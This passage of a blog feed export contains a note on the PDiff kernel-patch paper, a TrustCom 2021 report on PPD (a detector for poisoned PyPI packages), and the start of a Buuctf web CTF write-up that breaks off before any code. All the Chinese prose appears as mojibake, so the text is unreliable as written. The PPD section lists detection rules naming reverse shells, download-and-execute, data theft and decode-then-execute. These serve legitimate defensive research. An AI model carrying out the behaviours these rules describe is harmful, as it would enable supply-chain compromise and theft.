¸å¾€å¾€ä¼šè¢«ç¬¬ä¸‰æ–¹ä¾›åº”å•†å®¢åˆ¶åŒ–ï¼Œä»¥æ‹“å±•å…¶åŠŸèƒ½ç‚¹ã€‚</li><li>éæ ‡å‡†Buildingé…ç½®ï¼šç°ä»£æ“ä½œç³»ç»Ÿå†…æ ¸å¾€å¾€å¸¦æœ‰å…¶Buildingé…ç½®ï¼Œä»¥é€‚åº”åŠŸèƒ½çš„éœ€è¦</li></ul><p>ä»¥ä¸Šè¿™ä¸¤ç§æƒ…å†µæ˜¯ååˆ†æ™®éå­˜åœ¨çš„ï¼Œè€Œä¸”ä¼šåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå½±å“è¡¥ä¸å­˜åœ¨æ€§çš„æµ‹è¯•ï¼Œä»ç„¶æ˜¯å¾ˆéš¾å¤„ç†å¥½çš„ç‚¹ã€‚</p><h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b3f7a370-6b98-4979-9ba6-d13ebb6fc3e6.png"></p><p>PDiffè®¾è®¡çš„åŸºæœ¬åŸç†æ˜¯ï¼Œç›®æ ‡å†…æ ¸å’Œå®ƒçš„å‚è€ƒç‰ˆæœ¬ä¸è®ºåœ¨ä»£ç å±‚é¢å¦‚ä½•æ”¹å˜ï¼Œå®ƒä»¬åº”è¯¥å…·æœ‰ç±»ä¼¼çš„è¯­ä¹‰ï¼Œå…·ä½“çš„å·¥ä½œæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç®€å•æ¥è¯´åˆ†ä¸ºï¼š</p><ol><li>é”šå—é€‰æ‹©ï¼šPDiffä»å—è¡¥ä¸å½±å“çš„è·¯å¾„æ€»ç»“è¡¥ä¸è¯­ä¹‰ï¼Œæ‰€ä»¥éœ€è¦ç¡®å®šå¥½é”šå—ï¼Œä¸»è¦æ˜¯ä»å‚è€ƒç‰ˆæœ¬ä¸­æ‰¾åˆ°ä¸è¡¥ä¸ç›¸å…³çš„å‡½æ•°ï¼Œç„¶åå¼•å…¥é”šå—è¿™ä¸ªå®šä¹‰ï¼Œé”šå—çš„å±æ€§æœ‰ï¼š<ul><li>ä»»ä½•ç©¿è¿‡å—è¡¥ä¸å½±å“çš„ä»£ç å—çš„è·¯å¾„éƒ½ä¼šåˆ°è¾¾è‡³å°‘ä¸€ä¸ªé”šå—ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œèƒ½å¤Ÿä¿è¯æ‰€æœ‰å—è¡¥ä¸å½±å“çš„ä»£ç å—éƒ½è¢«è¦†ç›–ã€‚</li><li>åœ¨é”šå—ä¹‹åçš„ä»»ä½•è·¯å¾„éƒ½ä¸èƒ½åˆ°è¾¾å—è¡¥ä¸å½±å“çš„ä»£ç å—ã€‚è¿™å°±ä¿è¯äº†æ²¡æœ‰å—è¡¥ä¸å½±å“çš„ä»£ç å—ä¼šè¢«æˆªå–æ‰ã€‚</li><li>åœ¨å­˜åœ¨è¡¥ä¸ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œä¸€ä¸ªé”šå—åº”è¯¥åœ¨æ‰“äº†è¡¥ä¸åçš„ç‰ˆæœ¬ä¸­æœ‰å¯¹åº”çš„éƒ¨åˆ†ï¼Œåä¹‹äº¦ç„¶ã€‚</li></ul></li><li>è¡¥ä¸æ‘˜è¦ç”Ÿæˆï¼šç»™å®šè¡¥ä¸ç›¸å…³å‡½æ•°ä¸­çš„é”šå—ï¼ŒPDiffå°†æšä¸¾å‡½æ•°å¼€å§‹åˆ°é”šå—ç»“æŸçš„è·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„å°†è¢«è®¤å®šä¸ºå—åˆ°è¡¥ä¸å½±å“çš„è·¯å¾„ï¼Œç„¶åæ ¹æ®è·¯å¾„æ‘˜è¦è·å–è¡¥ä¸æ‘˜è¦ã€‚</li><li>åŸºäºæ‘˜è¦çš„è¡¥ä¸å­˜åœ¨æµ‹è¯•ï¼šåœ¨è·å¾—ä¸¤ä¸ªå‚è€ƒç‰ˆæœ¬å’Œç›®æ ‡å†…æ ¸çš„è¡¥ä¸æ‘˜è¦åï¼Œæˆ‘ä»¬è¡¡é‡å®ƒä»¬çš„ç›¸ä¼¼æ€§ä»¥ç¡®å®šè¡¥ä¸çŠ¶æ€ã€‚</li></ol><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>æœ¬æ–‡ä¸»è¦æ·±å…¥ç ”ç©¶äº†ä¸‹æ¸¸å‚å•†è®¾å¤‡ä¸­å†…æ ¸è¡¥ä¸çš„å­˜åœ¨æ€§æµ‹è¯•æ–¹æ³•ï¼Œå®ƒä¸»è¦å…‹æœäº†è¡¥ä¸å­˜åœ¨æ€§æ£€æµ‹çš„ä¸¤ä¸ªå…³é”®æŒ‘æˆ˜ï¼šç¬¬ä¸‰æ–¹ä»£ç å®šåˆ¶å’Œéæ ‡å‡†Buildingé…ç½®ã€‚è¯»è€…åœ¨è¯»å®Œè¿™ç¯‡paperåä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šä¸€æ˜¯å¯¹äºå—å½±å“ä»£ç å—èµ·å§‹éƒ¨åˆ†çš„åˆ¤å®šï¼Œå¦‚æœè¯´è¯¥å‡½æ•°å­˜åœ¨ç€çˆ¶å­å‡½æ•°å…³ç³»æ—¶ï¼Œåº”è¯¥å¦‚ä½•å–èˆï¼Œç©¶ç«Ÿæ˜¯æ‰©å¤§é”šå—å‘¢è¿˜æ˜¯ç²¾ç¡®ç¼©å°å‘¢ï¼ŸäºŒæ˜¯é€‰æ‹©çš„å‰åä¸¤ä¸ªä¸»æµç‰ˆæœ¬çš„é—®é¢˜ï¼Œå¦‚ä½•åœ¨æ²¡æœ‰å¯¹ä¸‹æ¸¸å†…æ ¸ä¸­è¡¥ä¸å­˜åœ¨æ€§åšå‡ºåˆ¤æ–­ä¾æ®å‰ï¼Œç²¾å‡†å®šä½åˆ°å‰åæœ€è¿‘çš„ä¸¤ä¸ªä¸»æµç‰ˆæœ¬ï¼Ÿè¿™å…¶ä¸­çš„èµ„æºæ¶ˆè€—ï¼Œæ•°æ®é›†ä½“é‡åˆæ˜¯å¦‚ä½•ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CCS&#39;20 </tag>
            
            <tag> Linux Kernel </tag>
            
            <tag> Semantic Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conference - TrustCom</title>
      <link href="/2021/10/25/Trustcom2021/"/>
      <url>/2021/10/25/Trustcom2021/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>ä¼šè®®åç§°ï¼šInternational Conference on Trust, Security and Privacy in Computing and Communications</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-å¿ƒå¾—ä½“ä¼š"><a href="#0x01-å¿ƒå¾—ä½“ä¼š" class="headerlink" title="0x01 å¿ƒå¾—ä½“ä¼š"></a>0x01 å¿ƒå¾—ä½“ä¼š</h2><p>è¿™æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ è¿™ç§éœ€è¦ç”¨å…¨è‹±æ–‡åšæ±‡æŠ¥çš„ä¼šè®®ï¼ŒåŒ…æ‹¬äº†å¯¹è‡ªå·±è®ºæ–‡çš„ä»‹ç»å’Œç°åœºå¬ä¼—çš„ç­”ç–‘ã€‚</p><p>å¯¹äºè‡ªå·±è®ºæ–‡çš„ä»‹ç»è¿™ä¸€éƒ¨åˆ†æ¥è¯´ï¼Œå…¨è‹±æ–‡æ±‡æŠ¥çš„éš¾åº¦å¹¶ä¸å¤§ï¼Œé¦–å…ˆæ˜¯å› ä¸ºåœ¨å†™è®ºæ–‡çš„æ—¶å€™å¤§é‡çš„å†…å®¹æˆ–è€…è¯´è¿™ç¯‡è®ºæ–‡ä¸­æ¶‰åŠåˆ°çš„å¤§éƒ¨åˆ†è‹±è¯­è¯æ±‡å’ŒçŸ­è¯­éƒ½å·²ç»å¾ˆç†Ÿæ‚‰ï¼Œé€šè¿‡çŸ­æœŸçš„æœ—è¯»å’ŒèƒŒè¯µæ˜¯èƒ½å¤Ÿè¾¾åˆ°é“­è®°äºå¿ƒçš„æ•ˆæœçš„ï¼›å…¶æ¬¡å°±æ˜¯åœ¨è®²æ¼”æ—¶é€šå¸¸ä¼šæœ‰æ¼”è®²è€…è§†å›¾ï¼Œå¦‚è‹¥æ²¡æœ‰ä¹Ÿå¯ä»¥å‡†å¤‡æè¯æœ¬ï¼Œä»¥è¾¾åˆ°è‰¯å¥½çš„è®²æ¼”æ•ˆæœã€‚</p><p>å¯¹äºç°åœºå¬ä¼—çš„ç­”ç–‘è¿™ä¸€éƒ¨åˆ†æ¥è¯´ï¼Œç”±äºç°åœºå¬ä¼—çš„è‹±è¯­æ°´å¹³ä¸åŒï¼ˆå›½äººè¿˜æ˜¯å¤–å›½äººï¼‰ã€å¬åŠ›/ç†è§£èƒ½åŠ›ä¸åŒã€å¯¹åŒä¸€ä¸ªäº‹æƒ…çš„çœ‹æ³•è§‚ç‚¹ä¸åŒï¼Œæå‡ºçš„é—®é¢˜ä¸å°½ç›¸åŒã€‚è¿™å°±ä¼šå‡ºç°å“ªæ€•æå‰å‡†å¤‡äº†ä¸€äº›é—®é¢˜ä½†æ˜¯è¿˜æ˜¯ä¼šè¢«é—®åˆ°æ²¡æœ‰å‡†å¤‡çš„åœ°æ–¹ï¼Œè¿™ä¸ªæ—¶å€™ç”±äºæœ¬èº«ä¸æ˜¯é•¿æœŸç”Ÿæ´»åœ¨è‹±è¯­äº¤æµçš„ç¯å¢ƒä¸­ï¼Œçµæ´»çš„è¿ç”¨è‹±è¯­è¿›è¡Œé—®ç­”äº¤æµæ˜¯ä¸€ä»¶ç‰¹åˆ«å›°éš¾çš„äº‹ã€‚ä½†è¿™ä¸ªæƒ…å†µä¹Ÿæœ‰åº”å¯¹ä¹‹æ³•ï¼Œé¦–å…ˆæå‰å‡†å¤‡é—®é¢˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ä¸€ä»¶äº‹ï¼Œä¸è®ºå¬ä¼—å¦‚ä½•æé—®ï¼Œå¯ä»¥é€‚å½“çš„å°†å…¶é—®é¢˜å¼•è‡³è‡ªå·±å‡†å¤‡è¿‡çš„é—®é¢˜ä¸Šï¼Œå¦‚æœå®åœ¨æ²¡æœ‰å‡†å¤‡è¿™æ–¹é¢çš„ç­”æ¡ˆï¼Œå¯ä»¥é€‚å½“çš„è§£é‡Šç›®å‰è¿™ä¸ªæ–¹é¢æ‰€åšçš„å·¥ä½œï¼Œå†è¡¨æ˜åœ¨ä»¥åçš„å®éªŒä¸­ä¼šåŠ å…¥ç›¸å…³è€ƒè™‘ï¼Œæœ€åè¡¨ç¤ºå¯¹è¿™ä¸ªé—®é¢˜çš„æ„Ÿè°¢ã€‚</p><h2 id="0x02-Malicious-Packages-Lurking-in-User-Friendly-Python-Package-Index"><a href="#0x02-Malicious-Packages-Lurking-in-User-Friendly-Python-Package-Index" class="headerlink" title="0x02 Malicious Packages Lurking in User-Friendly Python Package Index"></a>0x02 Malicious Packages Lurking in User-Friendly Python Package Index</h2><p>æœ¬æ–‡ä¸»è¦æ˜¯é’ˆå¯¹ç›®å‰PyPIï¼ˆæ‰€æœ‰Pythonç»„ä»¶åŒ…çš„ç´¢å¼•ï¼‰ç”Ÿæ€ç°çŠ¶çš„ä¸€æ¬¡è°ƒç ”ï¼Œç ”ç©¶äº†é’ˆå¯¹pipå®‰è£…å·¥å…·çš„æŠ•æ¯’æ”»å‡»ï¼Œè¿™æ˜¯ä¸€ç±»ä¾›åº”é“¾æ”»å‡»é—®é¢˜ï¼Œæ¶‰åŠå¼€æºè½¯ä»¶åº“å®‰å…¨ã€‚</p><h3 id="0x021-Intro"><a href="#0x021-Intro" class="headerlink" title="0x021 Intro"></a>0x021 Intro</h3><p>Pythonç”±äºå…¶åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸçš„ç«çƒ­ï¼Œå·²ç»é€æ¸æˆä¸ºäº†ä¸–ç•Œç¬¬ä¸‰å—æ¬¢è¿çš„å¼€å‘è¯­è¨€ã€‚è¿™å¾ˆå¤§ç¨‹åº¦ä¸Šå½’åŠŸäºå¼€æºç»„ä»¶ç´¢å¼•PyPIåŠå…¶å®‰è£…å·¥å…·PIPã€‚ä½†åœ¨æˆ‘ä»¬æ¢ç©¶PIPå®‰è£…è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°æœ‰è®¸å¤šæ”»å‡»äººå‘˜é’ˆå¯¹PIPè¿™ä¸€å®‰è£…è¿‡ç¨‹å±•å¼€äº†æ”»å‡»ã€‚æˆ‘ä»¬é’ˆå¯¹ç›®å‰æ‰€æœ‰çš„ç‹¬ç«‹æ£€æµ‹æ–¹æ¡ˆè¿›è¡Œäº†åˆ†æï¼Œæ‰¾å‡ºäº†å…¶å„è‡ªçš„ä¸€äº›çŸ­æ¿ï¼Œæœ€ç»ˆæ‰“ç®—å°†å¼‚å¸¸æ£€æµ‹è¿™ä¸€æ¦‚å¿µå¼•å…¥è‡³PIPæŠ•æ¯’æ”»å‡»æ£€æµ‹è¿™ä¸€é¢†åŸŸï¼Œè®¾è®¡å¹¶å®ç°äº†ä¸€ä¸ªç”¨äºæ£€æµ‹PIPæŠ•æ¯’çš„å·¥å…·ï¼ŒPPD(pip poisoning detection)ã€‚</p><h3 id="0x022-Method"><a href="#0x022-Method" class="headerlink" title="0x022 Method"></a>0x022 Method</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211025101137448.png" alt="image-20211025101137448"></p><p>ä¸Šå›¾æ˜¯æ•´ä¸ªPPDçš„ç»“æ„å›¾ï¼Œä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šæ•°æ®é¢„å¤„ç†ï¼Œç‰¹å¾æå–ï¼Œæ¨¡å‹è®­ç»ƒåŠç»“æœè¾“å‡º</p><p><strong>æ•°æ®é¢„å¤„ç†</strong></p><p>æ‰€æœ‰å®éªŒç”¨åˆ°çš„ç»„ä»¶åŒ…å‡æ˜¯ä»PyPIåŠå…¶é•œåƒç«™ä¸­ä¸‹è½½çš„ï¼Œåœ¨è¿™éƒ¨åˆ†æµç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯åˆ›æ–°æ€§æå‡ºäº†å…¥å£æ–‡ä»¶è¿™ä¸ªæ¦‚å¿µï¼Œå¹¶æ ¹æ®PIPçš„å®‰è£…æµç¨‹è®¾è®¡äº†ä¸€å¥—ç”¨äºæå–å…¥å£æ–‡ä»¶çš„æ–¹æ¡ˆã€‚å…·ä½“æ¥è¯´ï¼Œé’ˆå¯¹tar.gzçš„å®‰è£…åŒ…ï¼Œæˆ‘ä»¬æå–å…¶setup.pyï¼Œé’ˆå¯¹whl/zipçš„å®‰è£…åŒ…ï¼Œæˆ‘ä»¬æå–å…¶__init__.pyæˆ–æ˜¯ä»¥ç»„ä»¶åŒ…åå­—å‘½åçš„pyæ–‡ä»¶ã€‚å½“è·å–åˆ°äº†è¿™ä¸ªå…¥å£æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ASTå¯¹å…¶è¿›è¡Œè§£æï¼Œè·å–ImportèŠ‚ç‚¹å’ŒImportFromèŠ‚ç‚¹ï¼Œè¿™ä¸¤ä¸ªèŠ‚ç‚¹ä¸­åŒ…å«æœ‰æ‰€æœ‰éœ€è¦å¼•å…¥çš„é¢å¤–æ–‡ä»¶ã€‚æˆ‘ä»¬ä¼šéå†æ•´ä¸ªå®‰è£…åŒ…ï¼Œä»¥æ‰¾åˆ°é‚£äº›å­˜åœ¨äºåŒ…å†…ä½†åˆè¢«å…¥å£æ–‡ä»¶æ‰€è°ƒç”¨çš„pyæ–‡ä»¶ï¼Œç„¶ååˆå¹¶ä»¥å½¢æˆå®Œæ•´çš„å®‰è£…æ—¶è¿è¡Œä»£ç ã€‚</p><p><strong>ç‰¹å¾æå–</strong></p><p>æˆ‘ä»¬å°†æ‰€æœ‰ç‰¹å¾åˆ†ä¸ºä»£ç ç‰¹å¾å’Œç»„ä»¶åŒ…ç‰¹å¾ã€‚</p><p>å¯¹äºä»£ç ç‰¹å¾æ¥è¯´ï¼Œæˆ‘ä»¬ä¸»è¦è®¾ç½®äº†11ç§åœºæ™¯ç‰¹å¾ï¼ŒåŒ…æ‹¬ä»£ç æ‰§è¡Œã€å¤–è¿è¯·æ±‚ã€ç›®å½•éå†ã€æ–‡ä»¶æ“ä½œã€æ•æ„Ÿæ–‡ä»¶è¯»å–ã€å‹ç¼©ä¸è§£å‹ç¼©ã€å¼•å…¥å…¶ä»–æ–‡ä»¶ã€æœ€é•¿å­—ç¬¦ä¸²ã€ç¼–ç ä¸è§£ç ã€IP/URLã€entry_pointså†…å®¹ã€‚æˆ‘ä»¬é¦–å…ˆä¼šåˆ©ç”¨ASTå»è§£ææ•´ä¸ªä»£ç ï¼Œä½†æ˜¯ä¼šå­˜åœ¨ASTè§£æä¸æˆåŠŸçš„æƒ…å†µï¼Œè¿™æ—¶å€™ä¾¿åˆ©ç”¨æ­£åˆ™æ¥å¤„ç†ï¼Œå…·ä½“çš„å¯ä»¥é˜…è¯»è®ºæ–‡ã€‚</p><p>å¯¹äºç»„ä»¶åŒ…ç‰¹å¾æ¥è¯´ï¼Œåœ¨å‰æœŸçš„å®éªŒä¸­æˆ‘ä»¬åŠ å…¥äº†ä¾‹å¦‚ç‰ˆæœ¬å·ï¼Œå‘å¸ƒæ—¶é—´ï¼Œä½œè€…äººæ•°ç­‰è¯¸å¤šç»´åº¦çš„ç‰¹å¾ï¼Œä½†åœ¨å®éªŒç»“æœä¸­åé¦ˆå¹¶ä¸å¥½ï¼Œäºæ˜¯æˆ‘ä»¬æœ€ç»ˆé€‰æ‹©äº†èƒ½å¤Ÿå¿«é€Ÿæ£€æµ‹é’ˆå¯¹å¼€å‘äººå‘˜è¯¯æ‹¼å†™ï¼ˆæœ€å¸¸è§çš„ä¸€ç§æ”»å‡»æ‰‹æ®µï¼‰çš„ç‰¹å¾ï¼Œå³ç»„ä»¶åŒ…åç§°çš„ç¼–è¾‘è·ç¦»</p><p><strong>æ¨¡å‹æ£€æµ‹åŠç»“æœè¾“å‡º</strong></p><p>åœ¨é€‰å–æ¨¡å‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦è§£å†³ä¸‰ä¸ªé—®é¢˜ï¼š</p><ol><li>ç‰¹å¾ç»´åº¦è¾ƒé«˜æ—¶ï¼Œéœ€è¦ä¸€ä¸ªå¾ˆå¤§æ•°æ®é›†ï¼šç”±äºPyPIä½“é‡å¾ˆå¤§å¹¶ä¸”åœ¨ä¸æ–­å¢é•¿ï¼Œæˆ‘ä»¬æ˜¯èƒ½å¤Ÿæ„å»ºä¸€ä¸ªå¾ˆå¤§çš„æ•°æ®é›†çš„</li><li>ä¸€äº›ä½å¯†åº¦åŒºçš„æ ·æœ¬å®¹æ˜“è¢«è®¤å®šä¸ºå¼‚å¸¸æ ·æœ¬ï¼šæˆ‘ä»¬åˆ†æäº†æ‰€æœ‰ä»£ç é•¿åº¦å°äº100çš„ç»„ä»¶åŒ…ï¼Œåˆ†æå…¶ä»£ç é•¿åº¦åˆ†å¸ƒæƒ…å†µï¼Œæœ€åæˆ‘ä»¬å‘ç°é•¿åº¦å°äºç­‰äº10çš„ç»„ä»¶åŒ…å äº†43%ï¼Œè¿™ä¸€äº›ç»„ä»¶åŒ…æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“ä¸€çœ¼çœ‹å‡ºå…¶æ€§è´¨</li><li>é¢„å®šä¹‰çš„æ ·æœ¬åˆ†å¸ƒæƒ…å†µä¼šä¸¥é‡å½±å“åˆ°æ¨¡å‹è¾“å‡ºï¼šæˆ‘ä»¬é€‰æ‹©äº†å­¤ç«‹æ£®æ—æ¨¡å‹ï¼Œä¸»è¦æ˜¯å› ä¸ºå…¶åˆ©ç”¨åˆ‡å‰²çš„æ–¹å¼æ¥åˆ†å‰²æ ·æœ¬è€Œéé€šè¿‡æè¿°æ­£å¸¸æ ·æœ¬æ¥åŒºåˆ†å¼‚å¸¸ã€‚</li></ol><p>åœ¨åšæ¨¡å‹è®­ç»ƒæ—¶ï¼Œç”±äºæˆ‘ä»¬æ— æ³•ä¿è¯åœ¨è®­ç»ƒæ ·æœ¬ä¸­æ˜¯å¦ä¼šæ··æ‚æ¶æ„æ ·æœ¬ï¼Œå› æ­¤æˆ‘ä»¬é‡‡ç”¨åå‘äº¤å‰éªŒè¯çš„è®­ç»ƒæ–¹å¼ï¼Œä»¥æ­¤æ¥å°½å¯èƒ½å‡è½»ç”±äºé”™è¯¯å¼•å…¥æ¶æ„æ ·æœ¬è‡³è®­ç»ƒæ ·æœ¬ä¸­æ‰€å¼•èµ·çš„è¯¯å·®ã€‚åŒæ—¶ï¼Œç”±äºè®­ç»ƒæ ·æœ¬çš„å‡å°‘ï¼Œæˆ‘ä»¬è€ƒè™‘åˆ†åˆ«ä½¿ç”¨3ã€5ã€10æŠ˜åå‘äº¤å‰éªŒè¯åå»é‡è¾“å‡ºçš„æ–¹å¼ï¼Œå°½å¯èƒ½ä¿è¯è¾“å‡ºå¯èƒ½æ€§æœ€å¤§çš„å¼‚å¸¸æ ·æœ¬é›†åˆã€‚</p><p>åœ¨äººå·¥å®¡æŸ¥é˜¶æ®µï¼Œæˆ‘ä»¬é€šè¿‡åˆ†æå‡ åä¸ªä»¥å¾€æŠ«éœ²çš„æ¶æ„pythonç»„ä»¶åŒ…ï¼Œåˆæ­¥åˆ¶å®šäº†ä¸€å¥—ç”¨äºåˆ¤æ–­ç»„ä»¶åŒ…è¡Œä¸ºçš„è§„åˆ™ï¼Œå…·ä½“æ¥è¯´ï¼Œ</p><p>åº”å½“è¢«è®¤å®šæ˜¯å¯ç–‘ç»„ä»¶åŒ…çš„è¡Œä¸ºåŒ…æ‹¬ï¼š</p><ul><li>æ‰§è¡Œå¤–éƒ¨æ–‡ä»¶ï¼ˆ.sh or .exeï¼‰</li><li>åŒ…å«ç¼–ç åçš„å­—ç¬¦ä¸²</li><li>ä¸‹è½½è¿œç¨‹èµ„æºå¹¶è§£å‹</li><li>è¯»å–æ–‡ä»¶å¹¶ä¸”æ‰§è¡Œ</li><li>ä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶æˆ–ç§è‡ªæ‰“å¼€æœåŠ¡</li></ul><p>åº”å½“è¢«è®¤å®šæ˜¯æ¶æ„ç»„ä»¶åŒ…çš„è¡Œä¸ºåŒ…æ‹¬ï¼š</p><ul><li>ä¸‹è½½è¿œç¨‹æ–‡ä»¶å¹¶ä¸”æ‰§è¡Œ</li><li>åˆ›å»ºåå¼¹shell</li><li>ç›—å–æ•æ„Ÿæ•°æ®</li><li>è§£ç åæ‰§è¡Œ</li><li>æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨</li></ul><h3 id="0x023-Conclusion"><a href="#0x023-Conclusion" class="headerlink" title="0x023 Conclusion"></a>0x023 Conclusion</h3><p>ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬æ‰€åšçš„å·¥ä½œä¸»è¦æ˜¯æƒ³è¦å‡è½»é’ˆå¯¹æ•´ä¸ªPyPIç”Ÿæ€è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™çš„å·¥ä½œé‡ï¼Œç›®çš„åœ¨äºå‘ç°é‚£äº›åœ¨é‡çš„æ¶æ„ç»„ä»¶åŒ…ä»¥è¯´æ˜æ­¤é¡¹å·¥ä½œçš„å¿…è¦æ€§ï¼Œä½†è¿™ä¹Ÿå­˜åœ¨ç€ä¸€äº›å±€é™æ€§ï¼Œä¾‹å¦‚é’ˆå¯¹é‚£äº›åœ¨å®‰è£…çš„æ—¶å€™ä¸è§¦å‘ï¼Œè€Œåœ¨ä»£ç ä¸­importçš„æ—¶å€™è§¦å‘çš„æ¶æ„ç»„ä»¶åŒ…PPDå¹¶æ²¡æœ‰å¾ˆå¥½çš„æ£€æµ‹æ•ˆæœï¼Œäº¦æˆ–æ˜¯é’ˆå¯¹é‚£ä¸€ç±»åŠŸèƒ½å•ä¸€ä½†çš„ç¡®åŒ…å«æ¶æ„ä»£ç çš„ç»„ä»¶åŒ…æˆ‘ä»¬çš„æ–¹æ¡ˆä¹Ÿæš‚æ—¶æ— èƒ½ä¸ºåŠ›ã€‚</p><p>åœ¨æœªæ¥çš„å·¥ä½œä¸­ï¼Œæˆ‘ä»¬ä¼šæ€»ç»“å¹¶å¤„ç†è¿™ä¸€äº›ç»†èŠ‚ä¸Šçš„ä¸œè¥¿ï¼Œä»¥è¿›ä¸€æ­¥ä¼˜åŒ–å’Œæé«˜æˆ‘ä»¬çš„æ–¹æ¡ˆå‘½ä¸­ç‡ã€‚</p><h2 id="0x03-ä¸€äº›æƒ³æ³•"><a href="#0x03-ä¸€äº›æƒ³æ³•" class="headerlink" title="0x03 ä¸€äº›æƒ³æ³•"></a>0x03 ä¸€äº›æƒ³æ³•</h2><p>å¯¹äºä¸Šå°è®²æ¼”è¿™ç§äº‹ï¼Œè¿˜æ˜¯éœ€è¦å¾ˆå¤§çš„å‹‡æ°”çš„ï¼Œå°¤å…¶æ˜¯è¿™ç§éœ€è¦è„±ç¦»æ¯è¯­ç¯å¢ƒçš„è®²æ¼”ã€‚è¿™æ¬¡ä¼šè®®è¿˜å¥½æ˜¯åœ¨å›½å†…ï¼Œå›½äººå±…å¤šï¼Œè€å¤–ä¹Ÿéƒ½æ˜¯ä¸€äº›ç•™å­¦ç”Ÿï¼Œæ‰€ä»¥é„™äººä¹Ÿæ²¡æœ‰ç‰¹åˆ«ç´§å¼ ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€ï¼Œåšå¥½è®²æ¼”å‡†å¤‡ã€ä¸Šå°åšæ±‡æŠ¥ã€ä¸å¬ä¼—äº¤æµè®¨è®ºæ˜¯ä¸€ä»¶æ˜“äº‹ï¼Œç›¸åï¼Œè¿™æ˜¯ä¸€ä»¶è´¹æ—¶è´¹åŠ›ä¸”æ•ˆæœä¸æ˜æ˜¾çš„äº‹ã€‚ç›´åˆ°ç°åœ¨ï¼Œé„™äººçš„è‹±è¯­äº¤æµèƒ½åŠ›ä¹Ÿä¸å¤ªè¡Œï¼Œä¸­æ–‡è¯­è¨€é€»è¾‘å’Œè‹±æ–‡è¯­è¨€é€»è¾‘çš„åŒºåˆ«è¿˜æ˜¯å¤ªå¤§äº†ï¼Œéœ€è¦åé¢å¤šå¤šç»ƒä¹ æ‰å¯ã€‚</p><p>åŒæ—¶ï¼Œç¬¬ä¸€æ¬¡å­¦ç€åšè¿™ç§å­¦æœ¯æ±‡æŠ¥PPTä¹Ÿè¸©äº†å¾ˆå¤šå‘ï¼Œä¸èƒ½å…¨æ˜¯å›¾ä¹Ÿä¸èƒ½å…¨æ˜¯æ–‡å­—ï¼Œä¸€é¡µPPTä¸èƒ½å¤ªç©ºä¹Ÿä¸èƒ½å¤ªæ‹¥æŒ¤ï¼Œéœ€è¦åˆç†çš„å¸ƒå±€ï¼Œä½†æ˜¯æˆ‘ç‰¹åˆ«å–œæ¬¢æˆ‘åšçš„é¦–é¡µï¼Œåœ¨è¿™æ¬¡ä¼šè®®ä¸­çœ‹äº†ä¸€åœˆä¹Ÿæ²¡æœ‰æ¯”è¿™ä¸ªæ›´ç¬¦åˆæˆ‘å®¡ç¾çš„äº†ï¼Œå˜»å˜»å˜»ğŸ˜</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211025144127089.png" alt="image-20211025144127089"></p><p>ä¸‹æ¬¡å†æ¥å†å‰ï¼Œè®¤çœŸå­¦ä¹ ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Conference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustCom 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP - Buuctf Web Part</title>
      <link href="/2021/09/29/Buuctf%20Web%20Part/"/>
      <url>/2021/09/29/Buuctf%20Web%20Part/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>ç»ƒä¹ å¹³å°Buuctf</em></p><p><em>æŒç»­æ›´æ–°ç›´åˆ°Webéƒ¨åˆ†ç»“æŸ</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p><p><em>æœ€åä¸€æ¬¡æ›´æ–°äº2021-09-29</em></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 